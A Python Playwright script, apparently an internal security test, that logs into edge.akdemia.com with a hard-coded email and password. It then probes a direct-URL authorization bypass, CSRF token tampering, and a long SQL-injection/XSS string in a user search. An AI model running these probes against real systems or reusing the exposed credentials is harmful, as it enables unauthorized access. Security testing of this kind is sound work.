import time
from playwright.sync_api import sync_playwright

def run():
    p = sync_playwright().start()
    browser = p.chromium.launch(headless=True)
    context = browser.new_context(viewport={'width': 1366, 'height': 900})
    page = context.new_page()

    BASE_URL = 'https://edge.akdemia.com'
    print(f"--- 1. Testing Bypass URL (Multiple Roles) on {BASE_URL} ---")
    page.goto(f'{BASE_URL}/login')
    page.fill('#email_login', 'jcortez@akdemia.com')
    page.fill('#password_login', 'akdemia#2026*')
    page.click('input[type="submit"]')
    page.wait_for_load_state('networkidle')
    time.sleep(3)
    
    # We are already logged in, let's try to access a Guardian dashboard
    print("Navigating directly to Guardian dashboard...")
    res = page.goto(f'{BASE_URL}/guardians/84980/home')
    time.sleep(3)
    print(f"Direct Navigation Status: {res.status}")
    print(f"Current URL after bypass attempt: {page.url}")

    # Log out
    page.goto(f'{BASE_URL}/users/sign_out')
    
    print("\\n--- 2. Testing CSRF Timeout on Edge ---")
    page.goto(f'{BASE_URL}/login')
    page.fill('#email_login', 'jcortez@akdemia.com')
    page.fill('#password_login', 'akdemia#2026*')
    page.click('input[type="submit"]')
    page.wait_for_load_state('networkidle')
    time.sleep(3)
    
    print("Clearing CSRF token to simulate timeout...")
    page.evaluate('''() => {
        document.querySelector('meta[name="csrf-token"]').content = 'invalid_token_123';
    }''')
    
    page.evaluate('''() => {
        var modal = document.getElementById('change-to-any-user-modal');
        if(modal) {
            modal.classList.add('show', 'in');
            modal.style.display = 'block';
            document.body.classList.add('modal-open');
        }
    }''')
    time.sleep(1)
    
    print("Searching with invalid CSRF...")
    page.fill('#fill-user-info', 'prueba')
    page.press('#fill-user-info', 'Enter')
    time.sleep(4)
    
    html = page.evaluate("document.getElementById('search-results').innerHTML")
    if "Cambiar a usuario" in html or "result" in html.lower() or "li" in html.lower():
        print("CSRF Bypass: FAILED (Search worked even with invalid token).")
    else:
        print("CSRF Bypass: SUCCESS (Search blocked by invalid CSRF)")
        
    print("\\n--- 3. Testing Massive Search (SQLi / XSS / Load) on Edge ---")
    page.reload()
    time.sleep(3)
    page.evaluate('''() => {
        var modal = document.getElementById('change-to-any-user-modal');
        if(modal) {
            modal.classList.add('show', 'in');
            modal.style.display = 'block';
            document.body.classList.add('modal-open');
        }
    }''')
    time.sleep(1)
    
    massive_string = "A" * 5000 + "' OR 1=1 -- <script>alert(1)</script>"
    print(f"Injecting 5000+ characters with SQLi/XSS payload into search...")
    page.fill('#fill-user-info', massive_string)
    page.press('#fill-user-info', 'Enter')
    time.sleep(5)
    
    html_massive = page.evaluate("document.getElementById('search-results').innerHTML")
    print("Search results length:", len(html_massive))
    if "alert(1)" in html_massive:
        print("XSS Output: HTML reflected the payload. Check for sanitization.")
    if "Application Error" in html_massive or "500" in html_massive:
        print("Crash: Backend threw an unhandled 500 error on massive input.")
    else:
        print("Robustness: Backend handled it gracefully.")

    context.close()
    browser.close()
    p.stop()

if __name__ == '__main__':
    run()
